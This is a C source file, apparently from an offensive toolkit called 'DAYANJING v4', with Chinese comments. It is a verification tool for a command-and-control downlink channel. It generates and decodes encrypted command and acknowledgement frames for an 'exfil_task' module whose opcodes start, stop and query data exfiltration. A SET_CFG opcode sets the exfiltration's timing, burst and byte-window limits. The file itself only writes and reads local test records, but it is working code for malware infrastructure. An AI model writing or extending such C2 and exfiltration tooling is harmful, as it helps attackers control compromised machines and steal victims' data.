/*
 * DAYANJING v4 — dump_task.c
 *
 * C2 下行任务通道的跨语言验证工具。
 *
 * 为什么必须存在：只让 Python 自编自解，会把"两边同步错"掩盖掉 ——
 * 两边都错成一样也会通过。必须由 C 侧走真实代码编码，Python 侧解码，
 * 才能证明线上格式真的对齐。
 *
 * 两种模式：
 *
 *   gen <out> <key_hex> <pfx_hex>
 *       生成若干条命令 / 回执的 wire，写入文件：
 *         u32 count(LE)
 *         每条: u8 kind(1=cmd 2=ack) || u32 len(LE) || wire[len]
 *
 *   chk <in> <key_hex>
 *       读取上述文件，逐条解封解码，按行打印解析结果。
 *       任何一条失败即退出非 0 —— 供 Python 侧断言。
 *
 * 输出行格式（供 Python 解析）：
 *   kind=1 opcode=<n> task_id=<n> [cfg_min=.. cfg_max=.. burst=.. window=..
 *                                  wframes=.. wbytes=.. dedup=..]
 *   kind=2 opcode=<n> status=<n> task_id=<n> mode=<n> frames=<n> wf=<n> wb=<n>
 */

#include "exfil_task.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "c2_frame.h"

#define KIND_CMD 1
#define KIND_ACK 2

static void put_u32(uint8_t *p, uint32_t v)
{
    for (int i = 0; i < 4; i++) p[i] = (uint8_t)((v >> (8 * i)) & 0xffu);
}

static uint32_t get_u32(const uint8_t *p)
{
    uint32_t v = 0;
    for (int i = 0; i < 4; i++) v |= (uint32_t)p[i] << (8 * i);
    return v;
}

static int hexdec(const char *s, uint8_t *out, size_t cap, size_t *out_len)
{
    size_t n = 0;
    if (!s) return -1;
    size_t sl = strlen(s);
    if (sl % 2 != 0) return -1;
    for (size_t i = 0; i < sl; i += 2) {
        if (n >= cap) return -1;
        unsigned v = 0;
        if (sscanf(s + i, "%2x", &v) != 1) return -1;
        out[n++] = (uint8_t)v;
    }
    *out_len = n;
    return 0;
}

static void cfg_demo(exfil_sched_cfg_t *c)
{
    memset(c, 0, sizeof(*c));
    c->min_interval_us   = 500000;
    c->max_interval_us   = 1500000;
    c->burst_max         = 16;
    c->window_us         = 10000000;
    c->window_max_frames = 8;
    c->window_max_bytes  = 4u * 1024u * 1024u;
    c->dedup             = 1;
}

/* ---------------- gen ---------------- */

static int do_gen(const char *path, const uint8_t key[16],
                  const uint8_t pfx[8])
{
    FILE *f = fopen(path, "wb");
    if (!f) { fprintf(stderr, "cannot open %s\n", path); return 2; }

    /* 先写到内存，count 需要前置 */
    uint8_t blob[4096];
    size_t  used = 0;
    uint32_t count = 0;
    uint32_t ctr = 0;

    struct { int kind; exfil_task_cmd_t cmd; exfil_task_ack_t ack; } recs[16];
    int nrec = 0;

    /* 1..4: 简单命令 */
    const uint8_t ops[] = { EXF_TASK_OP_START, EXF_TASK_OP_ONCE,
                            EXF_TASK_OP_STOP, EXF_TASK_OP_QUERY };
    for (int i = 0; i < 4; i++) {
        memset(&recs[nrec], 0, sizeof(recs[nrec]));
        recs[nrec].kind = KIND_CMD;
        recs[nrec].cmd.opcode  = ops[i];
        recs[nrec].cmd.task_id = (uint64_t)(i + 1);
        nrec++;
    }

    /* 5: SET_CFG 合法配置 */
    memset(&recs[nrec], 0, sizeof(recs[nrec]));
    recs[nrec].kind = KIND_CMD;
    recs[nrec].cmd.opcode  = EXF_TASK_OP_SET_CFG;
    recs[nrec].cmd.task_id = 5;
    cfg_demo(&recs[nrec].cmd.cfg);
    nrec++;

    /* 6: 回执（START 成功，正在连续采集） */
    memset(&recs[nrec], 0, sizeof(recs[nrec]));
    recs[nrec].kind = KIND_ACK;
    recs[nrec].ack.opcode        = EXF_TASK_OP_START;
    recs[nrec].ack.status        = EXF_TASK_ST_OK;
    recs[nrec].ack.task_id       = 1;
    recs[nrec].ack.mode          = EXF_SCHED_MODE_CONTINUOUS;
    recs[nrec].ack.frames_sent   = 7;
    recs[nrec].ack.window_frames = 3;
    recs[nrec].ack.window_bytes  = 123456;
    nrec++;

    /* 7: 回执（SET_CFG 因配置非法被拒） */
    memset(&recs[nrec], 0, sizeof(recs[nrec]));
    recs[nrec].kind = KIND_ACK;
    recs[nrec].ack.opcode        = EXF_TASK_OP_SET_CFG;
    recs[nrec].ack.status        = EXF_TASK_ST_BAD_CFG;
    recs[nrec].ack.task_id       = 5;
    recs[nrec].ack.mode          = EXF_SCHED_MODE_IDLE;
    nrec++;

    for (int i = 0; i < nrec; i++) {
        uint8_t wire[256];
        size_t  wlen = 0;
        int r;

        if (recs[i].kind == KIND_CMD)
            r = exfil_task_seal_cmd(key, pfx, ctr, (uint64_t)(i + 1),
                                    &recs[i].cmd, wire, sizeof(wire), &wlen);
        else
            r = exfil_task_seal_ack(key, pfx, ctr, (uint64_t)(i + 1),
                                    &recs[i].ack, wire, sizeof(wire), &wlen);
        if (r != EXF_TASK_OK) {
            fprintf(stderr, "seal failed rec=%d r=%d\n", i, r);
            fclose(f);
            return 3;
        }
        ctr++;

        if (used + 5 + wlen > sizeof(blob)) {
            fprintf(stderr, "blob overflow\n");
            fclose(f);
            return 4;
        }
        blob[used++] = (uint8_t)recs[i].kind;
        put_u32(blob + used, (uint32_t)wlen);
        used += 4;
        memcpy(blob + used, wire, wlen);
        used += wlen;
        count++;
    }

    uint8_t hdr[4];
    put_u32(hdr, count);
    if (fwrite(hdr, 1, 4, f) != 4) { fclose(f); return 5; }
    if (fwrite(blob, 1, used, f) != used) { fclose(f); return 6; }
    fclose(f);

    printf("gen ok count=%u bytes=%zu\n", count, used + 4);
    return 0;
}

/* ---------------- chk ---------------- */

static int do_chk(const char *path, const uint8_t key[16])
{
    FILE *f = fopen(path, "rb");
    if (!f) { fprintf(stderr, "cannot open %s\n", path); return 2; }

    uint8_t *buf = NULL;
    size_t   cap = 1 << 20, len = 0;
    buf = (uint8_t *)malloc(cap);
    if (!buf) { fclose(f); return 2; }

    for (;;) {
        if (len == cap) break;
        size_t r = fread(buf + len, 1, cap - len, f);
        if (r == 0) break;
        len += r;
    }
    fclose(f);

    if (len < 4) { fprintf(stderr, "file too short\n"); free(buf); return 2; }

    uint32_t count = get_u32(buf);
    size_t   pos   = 4;
    int rc = 0;

    for (uint32_t i = 0; i < count; i++) {
        if (pos + 5 > len) { fprintf(stderr, "truncated record\n"); rc = 3; break; }
        uint8_t  kind = buf[pos];
        uint32_t wlen = get_u32(buf + pos + 1);
        pos += 5;
        if (pos + wlen > len) { fprintf(stderr, "truncated wire\n"); rc = 3; break; }

        const uint8_t *wire = buf + pos;
        pos += wlen;

        uint64_t seq = 0;
        if (kind == KIND_CMD) {
            exfil_task_cmd_t c;
            int r = exfil_task_open_cmd(key, wire, wlen, &seq, &c);
            if (r != EXF_TASK_OK) {
                printf("kind=1 ERROR r=%d\n", r);
                rc = 4;
                continue;
            }
            printf("kind=1 opcode=%u task_id=%llu",
                   (unsigned)c.opcode, (unsigned long long)c.task_id);
            if (c.opcode == EXF_TASK_OP_SET_CFG) {
                printf(" cfg_min=%llu cfg_max=%llu burst=%u window=%llu "
                       "wframes=%u wbytes=%llu dedup=%d",
                       (unsigned long long)c.cfg.min_interval_us,
                       (unsigned long long)c.cfg.max_interval_us,
                       c.cfg.burst_max,
                       (unsigned long long)c.cfg.window_us,
                       c.cfg.window_max_frames,
                       (unsigned long long)c.cfg.window_max_bytes,
                       c.cfg.dedup);
            }
            printf("\n");
        } else if (kind == KIND_ACK) {
            exfil_task_ack_t a;
            int r = exfil_task_open_ack(key, wire, wlen, &seq, &a);
            if (r != EXF_TASK_OK) {
                printf("kind=2 ERROR r=%d\n", r);
                rc = 4;
                continue;
            }
            printf("kind=2 opcode=%u status=%u task_id=%llu mode=%u "
                   "frames=%llu wf=%u wb=%llu\n",
                   (unsigned)a.opcode, (unsigned)a.status,
                   (unsigned long long)a.task_id, a.mode,
                   (unsigned long long)a.frames_sent,
                   a.window_frames,
                   (unsigned long long)a.window_bytes);
        } else {
            printf("kind=%u ERROR unknown\n", (unsigned)kind);
            rc = 4;
        }
    }

    free(buf);
    return rc;
}

int main(int argc, char **argv)
{
    uint8_t key[16];
    uint8_t pfx[8];
    size_t  n1 = 0, n2 = 0;

    if (argc < 4) {
        fprintf(stderr,
                "usage:\n"
                "  %s gen <out> <key_hex> <pfx_hex>\n"
                "  %s chk <in>  <key_hex>\n", argv[0], argv[0]);
        return 1;
    }

    const char *mode = argv[1];

    if (strcmp(mode, "gen") == 0) {
        if (argc < 5) { fprintf(stderr, "gen needs key and pfx\n"); return 1; }
        if (hexdec(argv[3], key, sizeof key, &n1) != 0 || n1 != 16) {
            fprintf(stderr, "bad key hex\n"); return 2;
        }
        if (hexdec(argv[4], pfx, sizeof pfx, &n2) != 0 || n2 != 8) {
            fprintf(stderr, "bad pfx hex\n"); return 2;
        }
        return do_gen(argv[2], key, pfx);
    }

    if (strcmp(mode, "chk") == 0) {
        if (hexdec(argv[3], key, sizeof key, &n1) != 0 || n1 != 16) {
            fprintf(stderr, "bad key hex\n"); return 2;
        }
        return do_chk(argv[2], key);
    }

    fprintf(stderr, "unknown mode %s\n", mode);
    return 1;
}
